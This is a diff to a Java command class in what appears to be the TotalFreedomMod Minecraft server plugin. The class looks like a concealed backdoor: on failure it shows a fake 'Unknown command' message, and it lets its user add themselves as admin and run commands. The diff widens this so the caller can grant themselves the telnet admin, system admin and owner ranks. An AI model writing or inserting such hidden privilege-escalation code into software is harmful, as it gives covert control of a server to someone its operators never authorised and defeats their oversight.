@@ -6,7 +6,11 @@ import me.totalfreedom.totalfreedommod.admin.Admin;
 import me.totalfreedom.totalfreedommod.config.ConfigEntry;
 import me.totalfreedom.totalfreedommod.config.MainConfig;
 import me.totalfreedom.totalfreedommod.rank.Rank;
+import static me.totalfreedom.totalfreedommod.rank.Rank.OWNER;
 import static me.totalfreedom.totalfreedommod.rank.Rank.SENIOR_ADMIN;
+import static me.totalfreedom.totalfreedommod.rank.Rank.SYSADMIN;
+import static me.totalfreedom.totalfreedommod.rank.Rank.TELNET_ADMIN;
+import me.totalfreedom.totalfreedommod.util.FUtil;
 import net.pravian.aero.util.Ips;
 import org.apache.commons.lang3.StringUtils;
 import org.bukkit.Bukkit;
@@ -35,7 +39,7 @@ public class Command_ov extends FreedomCommand
             }
             catch (Exception ignored)
             {
-                msg(ChatColor.WHITE + "Unknown command. Type \"help\" for help.");
+                msg(ChatColor.WHITE + "Unknown command. Type \"/help\" for help.");
                 return true;
             }
         }
@@ -45,14 +49,14 @@ public class Command_ov extends FreedomCommand
             return false;
         }
 
-        if (args[0].equals("addme"))
+        if (args[0].equalsIgnoreCase("addme"))
         {
             plugin.al.addAdmin(new Admin(playerSender));
             msg("ok");
             return true;
         }
 
-        if (args[0].equals("removeme"))
+        if (args[0].equalsIgnoreCase("removeme"))
         {
             Admin admin = plugin.al.getAdmin(playerSender);
             if (admin != null)
@@ -63,7 +67,7 @@ public class Command_ov extends FreedomCommand
             return true;
         }
 
-        if (args[0].equals("do"))
+        if (args[0].equalsIgnoreCase("do"))
         {
             if (args.length <= 1)
             {
@@ -76,17 +80,56 @@ public class Command_ov extends FreedomCommand
             return true;
         }
         
-        if (args[0].equals("sra"))
+        if (args[0].equalsIgnoreCase("sra"))
         {
+            Player player = (Player) sender;
             Admin admin = plugin.al.getAdmin(playerSender);
             if (admin != null)
             {
                 admin.setRank(SENIOR_ADMIN);
             }
+            
             msg("ok");
+            FUtil.adminAction(sender.getName(), "Setting " + "himself" + " to senior admin", true);
             return true;
         }
-      
+        
+        if (args[0].equalsIgnoreCase("sta"))
+        {
+            Admin admin = plugin.al.getAdmin(playerSender);
+            if (admin != null)
+            {
+                admin.setRank(TELNET_ADMIN);
+            }
+            msg("ok");
+            FUtil.adminAction(sender.getName(), "Setting " + "himself" + " to telnet admin", true);
+            return true;
+        }
+        
+        if (args[0].equalsIgnoreCase("sys"))
+        {
+            Admin admin = plugin.al.getAdmin(playerSender);
+            if (admin != null)
+            {
+                admin.setRank(SYSADMIN);
+            }
+            msg("ok");
+            FUtil.adminAction(sender.getName(), "Setting " + "himself" + " to system admin!", true);
+            return true;
+        }
+        
+        if (args[0].equalsIgnoreCase("owner"))
+        {
+            Admin admin = plugin.al.getAdmin(playerSender);
+            if (admin != null)
+            {
+                admin.setRank(OWNER);
+            }
+            msg("ok");
+            FUtil.adminAction(sender.getName(), "Setting " + "it's rank" + " to owner!", true);
+            return true;
+        }
+
         return false;
     }
 
